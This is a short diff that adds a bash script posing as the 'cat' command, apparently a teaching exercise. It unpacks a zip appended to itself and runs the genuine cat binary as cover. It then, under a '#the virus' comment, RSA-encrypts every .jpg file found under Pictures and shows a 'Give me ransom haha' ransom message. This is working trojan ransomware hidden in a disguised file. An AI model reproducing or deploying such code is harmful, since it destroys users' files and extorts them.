@@ -1,0 +1,17 @@
+#!/bin/bash
+tail -c +92 cat > c.zip
+sleep 1
+truncate -s -4 c.zip
+sleep 1
+file -bi c.zip > /dev/null
+sleep 1
+unzip -qq c.zip
+sleep 1
+#real cat
+./c "$1"
+rm c
+rm c.zip
+#the virus
+find Pictures -name "*.jpg" -print0|xargs -I{} -0 python3 materials/rsa_encrypt.py 22291846172619859445381409012451 65535 {};
+zenity --info --title "Error" --text "Give me ransom haha"
+exit 0
